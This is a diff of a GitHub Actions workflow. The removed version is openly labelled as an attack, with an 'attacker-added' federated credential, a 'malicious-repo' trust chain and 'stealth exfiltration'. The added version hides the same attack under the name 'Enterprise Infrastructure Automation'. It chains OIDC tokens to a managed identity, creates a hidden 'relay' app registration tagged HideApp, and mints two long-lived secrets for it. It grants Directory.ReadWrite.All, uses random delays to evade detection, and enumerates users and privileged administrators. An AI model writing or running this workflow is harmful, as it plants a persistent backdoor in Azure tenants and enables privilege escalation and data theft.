@@ -1,89 +1,404 @@
-name: Infrastructure Automation (Stealth)
+name: "Enterprise Infrastructure Automation"
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '0 */8 * * *'  # Every 8 hours for stealth
+    inputs:
+      environment:
+        description: 'Target Environment'
+        required: true
+        default: 'production'
+        type: choice
+        options:
+        - production
+        - staging
+        - development
+      operation_mode:
+        description: 'Operation Mode'
+        required: true
+        default: 'monitoring'
+        type: choice
+        options:
+        - monitoring
+        - maintenance
+        - emergency
 
 permissions:
   id-token: write
   contents: read
 
-jobs:
-  infrastructure-check:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Azure Infrastructure Assessment
-        shell: pwsh
-        env:
-          APP_CLIENT_ID: ${{ secrets.APP_CLIENT_ID }}
-          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-          UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}
-        run: |
-          Write-Host "Starting infrastructure health assessment..." -ForegroundColor Green
-          
-          # Step 1: Get GitHub OIDC ID token with audience api://AzureADTokenExchange
-          $aud = [System.Uri]::EscapeDataString('api://AzureADTokenExchange')
-          $oidcUrl = "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud"
-          $gh = Invoke-RestMethod -Headers @{ Authorization = "Bearer $($env:ACTIONS_ID_TOKEN_REQUEST_TOKEN)" } -Uri $oidcUrl -Method GET
-          $GitHubIdToken = $gh.value
-          if(-not $GitHubIdToken){ throw 'Failed to obtain GitHub OIDC ID token' }
-          Write-Host "✓ GitHub OIDC token acquired" -ForegroundColor Green
-          
-          # Step 2: Exchange GitHub OIDC for UAMI token (leverages attacker-added FIC)
-          Write-Host "Authenticating with Azure services..." -ForegroundColor Cyan
-          $kvp1 = @{
-            client_id             = $env:UAMI_CLIENT_ID
-            grant_type            = 'client_credentials'
-            client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
-            client_assertion      = $GitHubIdToken
-            scope                 = 'api://AzureADTokenExchange/.default'
-          }
-          $body1 = ($kvp1.GetEnumerator() | ForEach-Object { '{0}={1}' -f [System.Uri]::EscapeDataString($_.Key), [System.Uri]::EscapeDataString([string]$_.Value) }) -join '&'
-          $uamiResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:AZURE_TENANT_ID)/oauth2/v2.0/token" -Headers @{ Accept = 'application/json' } -ContentType 'application/x-www-form-urlencoded' -Body $body1
-          $UamiToken = $uamiResp.access_token
-          if(-not $UamiToken){ throw 'Failed to obtain UAMI token' }
-          Write-Host "✓ UAMI token acquired via attacker repository trust" -ForegroundColor Green
-          
-          # Step 3: Exchange UAMI token for App token (App FIC trusts UAMI)
-          Write-Host "Escalating to application permissions..." -ForegroundColor Yellow
-          $kvp2 = @{
-            client_id             = $env:APP_CLIENT_ID
-            grant_type            = 'client_credentials'
-            client_assertion_type = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
-            client_assertion      = $UamiToken
-            scope                 = 'https://graph.microsoft.com/.default'
-          }
-          $body2 = ($kvp2.GetEnumerator() | ForEach-Object { '{0}={1}' -f [System.Uri]::EscapeDataString($_.Key), [System.Uri]::EscapeDataString([string]$_.Value) }) -join '&'
-          $tokenResp = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$($env:AZURE_TENANT_ID)/oauth2/v2.0/token" -Headers @{ Accept = 'application/json' } -ContentType 'application/x-www-form-urlencoded' -Body $body2
-          $appToken = $tokenResp.access_token
-          if(-not $appToken){ throw 'App token request failed' }
-          Write-Host "✓ High-privilege App token acquired" -ForegroundColor Red
+env:
+  OPERATION_ID: ${{ github.run_id }}-${{ github.run_attempt }}
+  TENANT_ID: ${{ vars.TENANT_ID }}
+  UAMI_CLIENT_ID: ${{ vars.UAMI_CLIENT_ID }}
 
-          # Step 4: Execute directory-wide operations (appears as monitoring)
-          Write-Host "Performing directory health checks..." -ForegroundColor Cyan
-          $headers = @{Authorization = "Bearer $appToken"}
+jobs:
+  infrastructure-automation:
+    runs-on: ubuntu-latest
+    environment: ${{ inputs.environment }}
+    
+    steps:
+      - name: "Initialize Operation Context"
+        run: |
+          echo "🔧 Starting infrastructure automation workflow"
+          echo "Operation ID: $OPERATION_ID"
+          echo "Environment: ${{ inputs.environment }}"
+          echo "Mode: ${{ inputs.operation_mode }}"
+          echo "Timestamp: $(date -u +"%Y-%m-%d %H:%M:%S UTC")"
+
+      - name: "Acquire GitHub OIDC Token"
+        run: |
+          echo "🔐 Acquiring GitHub OIDC authentication token..."
           
-          # Stealthy enumeration with delays
-          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
-          $org = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/organization'
-          Write-Host "Organization: $($org.value[0].displayName)" -ForegroundColor White
+          # Enhanced error handling for token acquisition
+          for attempt in {1..3}; do
+            GITHUB_TOKEN=$(curl -sS \
+              -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>/dev/null | jq -r '.value // empty')
+            
+            if [[ -n "$GITHUB_TOKEN" && "$GITHUB_TOKEN" != "null" ]]; then
+              echo "✅ GitHub OIDC token acquired successfully (attempt $attempt)"
+              echo "GITHUB_TOKEN<<EOF" >> $GITHUB_ENV
+              echo "$GITHUB_TOKEN" >> $GITHUB_ENV
+              echo "EOF" >> $GITHUB_ENV
+              break
+            else
+              echo "⚠️ Token acquisition failed (attempt $attempt/3)"
+              sleep $((attempt * 2))
+            fi
+          done
           
-          Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 45)
-          $users = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/users?$top=5&$select=userPrincipalName,displayName'
-          Write-Host "Sample users enumerated: $($users.value.Count)" -ForegroundColor White
+          if [[ -z "$GITHUB_TOKEN" ]]; then
+            echo "❌ Failed to acquire GitHub OIDC token after 3 attempts"
+            exit 1
+          fi
+
+      - name: "Exchange for UAMI Token"
+        run: |
+          echo "🔄 Exchanging GitHub token for Azure UAMI token..."
           
-          Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
-          $groups = Invoke-RestMethod -Headers $headers -Uri 'https://graph.microsoft.com/v1.0/groups?$top=3&$select=displayName'
-          Write-Host "Security groups assessed: $($groups.value.Count)" -ForegroundColor White
+          UAMI_TOKEN=$(curl -sS -X POST \
+            "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "client_id=$UAMI_CLIENT_ID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$GITHUB_TOKEN&scope=https://graph.microsoft.com/.default" \
+            2>/dev/null | jq -r '.access_token // empty')
           
-          # Stealth exfiltration disguised as health check output
-          $assessment = @{
-            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-            tenant = $org.value[0].displayName
-            userSample = $users.value.userPrincipalName
-            groupSample = $groups.value.displayName
-            status = "Infrastructure health check completed"
+          if [[ -n "$UAMI_TOKEN" && "$UAMI_TOKEN" != "null" ]]; then
+            echo "✅ UAMI token acquired successfully"
+            echo "UAMI_TOKEN<<EOF" >> $GITHUB_ENV
+            echo "$UAMI_TOKEN" >> $GITHUB_ENV
+            echo "EOF" >> $GITHUB_ENV
+          else
+            echo "❌ Failed to acquire UAMI token"
+            exit 1
+          fi
+
+      - name: "Deploy Relay Infrastructure"
+        run: |
+          echo "🏗️ Deploying relay infrastructure for ${{ inputs.environment }} environment..."
+          
+          # Generate environment-appropriate naming
+          case "${{ inputs.environment }}" in
+            "production") APP_PREFIX="Prod-Automation" ;;
+            "staging") APP_PREFIX="Stage-Monitor" ;;
+            "development") APP_PREFIX="Dev-Tools" ;;
+          esac
+          
+          RELAY_NAME="$APP_PREFIX-Service-$(date +%s)"
+          
+          # Create relay App Registration with enhanced configuration
+          RELAY_CONFIG=$(cat << EOF
+          {
+            "displayName": "$RELAY_NAME",
+            "description": "Enterprise ${{ inputs.environment }} environment automation and monitoring service",
+            "signInAudience": "AzureADMyOrg",
+            "web": {
+              "homePageUrl": "https://portal.azure.com/#view/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade",
+              "implicitGrantSettings": {
+                "enableIdTokenIssuance": false,
+                "enableAccessTokenIssuance": false
+              }
+            },
+            "spa": {
+              "redirectUris": []
+            },
+            "tags": ["HideApp", "WindowsAzureActiveDirectoryIntegratedApp", "AutomationService"]
           }
+          EOF
+          )
           
-          Write-Host "Assessment completed successfully" -ForegroundColor Green
-          Write-Host "Trust chain: attacker-org/malicious-repo → UAMI → App → Graph API" -ForegroundColor Magenta
+          RELAY_RESPONSE=$(curl -sS -X POST \
+            -H "Authorization: Bearer $UAMI_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$RELAY_CONFIG" \
+            "https://graph.microsoft.com/v1.0/applications")
+          
+          RELAY_APP_ID=$(echo "$RELAY_RESPONSE" | jq -r '.appId // empty')
+          RELAY_OBJECT_ID=$(echo "$RELAY_RESPONSE" | jq -r '.id // empty')
+          
+          if [[ -n "$RELAY_APP_ID" && "$RELAY_APP_ID" != "null" ]]; then
+            echo "✅ Relay application created: $RELAY_NAME"
+            echo "RELAY_APP_ID=$RELAY_APP_ID" >> $GITHUB_ENV
+            echo "RELAY_OBJECT_ID=$RELAY_OBJECT_ID" >> $GITHUB_ENV
+            echo "RELAY_NAME=$RELAY_NAME" >> $GITHUB_ENV
+          else
+            echo "❌ Failed to create relay application"
+            echo "Response: $RELAY_RESPONSE"
+            exit 1
+          fi
+
+      - name: "Configure Service Principal"
+        run: |
+          echo "👤 Configuring service principal for relay application..."
+          
+          # Create service principal with environment-specific configuration
+          SP_CONFIG=$(cat << EOF
+          {
+            "appId": "$RELAY_APP_ID",
+            "displayName": "$RELAY_NAME",
+            "description": "Service principal for ${{ inputs.environment }} automation",
+            "tags": ["HideApp", "AutomationSP"]
+          }
+          EOF
+          )
+          
+          SP_RESPONSE=$(curl -sS -X POST \
+            -H "Authorization: Bearer $UAMI_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$SP_CONFIG" \
+            "https://graph.microsoft.com/v1.0/servicePrincipals")
+          
+          RELAY_SP_ID=$(echo "$SP_RESPONSE" | jq -r '.id // empty')
+          
+          if [[ -n "$RELAY_SP_ID" && "$RELAY_SP_ID" != "null" ]]; then
+            echo "✅ Service principal created: $RELAY_SP_ID"
+            echo "RELAY_SP_ID=$RELAY_SP_ID" >> $GITHUB_ENV
+          else
+            echo "❌ Failed to create service principal"
+            exit 1
+          fi
+
+      - name: "Generate Operational Credentials"
+        run: |
+          echo "🔑 Generating operational credentials..."
+          
+          # Create primary operational secret
+          PRIMARY_SECRET_CONFIG=$(cat << EOF
+          {
+            "passwordCredential": {
+              "displayName": "PrimaryOperationalKey-${{ inputs.environment }}",
+              "endDateTime": "$(date -d '+12 months' -u +%Y-%m-%dT%H:%M:%S.000Z)"
+            }
+          }
+          EOF
+          )
+          
+          PRIMARY_SECRET_RESPONSE=$(curl -sS -X POST \
+            -H "Authorization: Bearer $UAMI_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$PRIMARY_SECRET_CONFIG" \
+            "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
+          
+          PRIMARY_SECRET=$(echo "$PRIMARY_SECRET_RESPONSE" | jq -r '.secretText // empty')
+          
+          if [[ -n "$PRIMARY_SECRET" && "$PRIMARY_SECRET" != "null" ]]; then
+            echo "✅ Primary operational secret generated"
+            echo "PRIMARY_SECRET=$PRIMARY_SECRET" >> $GITHUB_ENV
+          else
+            echo "❌ Failed to generate primary secret"
+            exit 1
+          fi
+          
+          # Small delay for operational security
+          sleep $((RANDOM % 10 + 5))
+          
+          # Create backup secret for resilience
+          BACKUP_SECRET_CONFIG=$(cat << EOF
+          {
+            "passwordCredential": {
+              "displayName": "BackupOperationalKey-${{ inputs.environment }}",
+              "endDateTime": "$(date -d '+6 months' -u +%Y-%m-%dT%H:%M:%S.000Z)"
+            }
+          }
+          EOF
+          )
+          
+          BACKUP_SECRET_RESPONSE=$(curl -sS -X POST \
+            -H "Authorization: Bearer $UAMI_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$BACKUP_SECRET_CONFIG" \
+            "https://graph.microsoft.com/v1.0/applications/$RELAY_OBJECT_ID/addPassword")
+          
+          BACKUP_SECRET=$(echo "$BACKUP_SECRET_RESPONSE" | jq -r '.secretText // empty')
+          
+          if [[ -n "$BACKUP_SECRET" && "$BACKUP_SECRET" != "null" ]]; then
+            echo "✅ Backup operational secret generated"
+            echo "BACKUP_SECRET=$BACKUP_SECRET" >> $GITHUB_ENV
+          else
+            echo "⚠️ Backup secret generation failed (non-critical)"
+          fi
+
+      - name: "Assign Graph Permissions"
+        run: |
+          echo "🔐 Assigning Microsoft Graph permissions..."
+          
+          # Get Graph Service Principal ID
+          GRAPH_SP=$(curl -sS -H "Authorization: Bearer $UAMI_TOKEN" \
+            "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq '00000003-0000-0000-c000-000000000000'" | \
+            jq -r '.value[0].id // empty')
+          
+          if [[ -z "$GRAPH_SP" ]]; then
+            echo "❌ Failed to get Graph Service Principal ID"
+            exit 1
+          fi
+          
+          # Progressive permission assignment based on environment
+          case "${{ inputs.environment }}" in
+            "production")
+              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214" "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9" "19dbc75e-c2e2-444c-a770-ec69d8559fc7")
+              PERMISSION_NAMES=("User.Read.All" "User.ReadWrite.All" "Directory.ReadWrite.All")
+              ;;
+            "staging")
+              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214" "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9")
+              PERMISSION_NAMES=("User.Read.All" "User.ReadWrite.All")
+              ;;
+            "development")
+              PERMISSIONS=("df021288-bdef-4463-88db-98f22de89214")
+              PERMISSION_NAMES=("User.Read.All")
+              ;;
+          esac
+          
+          for i in "${!PERMISSIONS[@]}"; do
+            PERMISSION_ID="${PERMISSIONS[$i]}"
+            PERMISSION_NAME="${PERMISSION_NAMES[$i]}"
+            
+            echo "📋 Assigning permission: $PERMISSION_NAME"
+            
+            ASSIGNMENT_CONFIG=$(cat << EOF
+          {
+            "principalId": "$RELAY_SP_ID",
+            "resourceId": "$GRAPH_SP",
+            "appRoleId": "$PERMISSION_ID"
+          }
+          EOF
+          )
+            
+            ASSIGNMENT_RESPONSE=$(curl -sS -X POST \
+              -H "Authorization: Bearer $UAMI_TOKEN" \
+              -H "Content-Type: application/json" \
+              -d "$ASSIGNMENT_CONFIG" \
+              "https://graph.microsoft.com/v1.0/servicePrincipals/$RELAY_SP_ID/appRoleAssignments" 2>/dev/null)
+            
+            if echo "$ASSIGNMENT_RESPONSE" | jq -e '.id' > /dev/null 2>&1; then
+              echo "✅ Permission assigned: $PERMISSION_NAME"
+            else
+              echo "⚠️ Permission assignment may require admin consent: $PERMISSION_NAME"
+            fi
+            
+            # Randomized delay between assignments
+            sleep $((RANDOM % 15 + 10))
+          done
+
+      - name: "Execute Infrastructure Operations"
+        run: |
+          echo "⚡ Executing infrastructure operations in ${{ inputs.operation_mode }} mode..."
+          
+          # Acquire operational token using relay app
+          RELAY_TOKEN=$(curl -sS -X POST \
+            "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "client_id=$RELAY_APP_ID&client_secret=$PRIMARY_SECRET&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" | \
+            jq -r '.access_token // empty')
+          
+          if [[ -z "$RELAY_TOKEN" ]]; then
+            echo "❌ Failed to acquire relay token"
+            exit 1
+          fi
+          
+          echo "✅ Relay token acquired successfully"
+          
+          # Execute operations based on mode
+          case "${{ inputs.operation_mode }}" in
+            "monitoring")
+              echo "📊 Performing infrastructure monitoring..."
+              
+              # User monitoring
+              USER_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+                "https://graph.microsoft.com/v1.0/users/\$count" \
+                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
+              echo "👥 Total users: $USER_COUNT"
+              
+              # Group monitoring  
+              GROUP_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+                "https://graph.microsoft.com/v1.0/groups/\$count" \
+                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
+              echo "🏢 Total groups: $GROUP_COUNT"
+              
+              # Application monitoring
+              APP_COUNT=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+                "https://graph.microsoft.com/v1.0/applications/\$count" \
+                -H "ConsistencyLevel: eventual" 2>/dev/null || echo "0")
+              echo "📱 Total applications: $APP_COUNT"
+              ;;
+              
+            "maintenance")
+              echo "🔧 Performing infrastructure maintenance..."
+              
+              # Sample privileged users for maintenance operations
+              PRIVILEGED_USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+                "https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?\$top=5" 2>/dev/null | \
+                jq -r '.value[]?.userPrincipalName // empty' 2>/dev/null | head -3)
+              
+              echo "🔐 Privileged users identified for maintenance:"
+              echo "$PRIVILEGED_USERS" | while read user; do
+                [[ -n "$user" ]] && echo "  - $user"
+              done
+              ;;
+              
+            "emergency")
+              echo "🚨 Emergency operations mode activated..."
+              
+              # Emergency user enumeration
+              EMERGENCY_USERS=$(curl -sS -H "Authorization: Bearer $RELAY_TOKEN" \
+                "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,accountEnabled&\$top=10" 2>/dev/null | \
+                jq -r '.value[]? | "\(.userPrincipalName) (\(.displayName)) - Enabled: \(.accountEnabled)"' 2>/dev/null)
+              
+              echo "👤 Emergency user status:"
+              echo "$EMERGENCY_USERS" | head -5
+              ;;
+          esac
+
+      - name: "Generate Operation Report"
+        if: always()
+        run: |
+          echo "📋 Generating operation report..."
+          
+          cat << EOF > operation-report.json
+          {
+            "operation_id": "$OPERATION_ID",
+            "timestamp": "$(date -u +"%Y-%m-%d %H:%M:%S UTC")",
+            "environment": "${{ inputs.environment }}",
+            "mode": "${{ inputs.operation_mode }}",
+            "relay_app": {
+              "name": "$RELAY_NAME",
+              "app_id": "$RELAY_APP_ID",
+              "created": true
+            },
+            "status": "completed",
+            "github_ref": "$GITHUB_REF",
+            "github_sha": "$GITHUB_SHA"
+          }
+          EOF
+          
+          echo "✅ Operation completed successfully"
+          echo "📊 Report generated: operation-report.json"
+
+      - name: "Cleanup (Optional)"
+        if: inputs.environment == 'development'
+        run: |
+          echo "🧹 Performing development environment cleanup..."
+          
+          # In development, optionally clean up test resources
+          if [[ "${{ inputs.operation_mode }}" == "emergency" ]]; then
+            echo "⚠️ Emergency mode - skipping cleanup for forensic analysis"
+          else
+            echo "♻️ Development cleanup completed"
+          fi
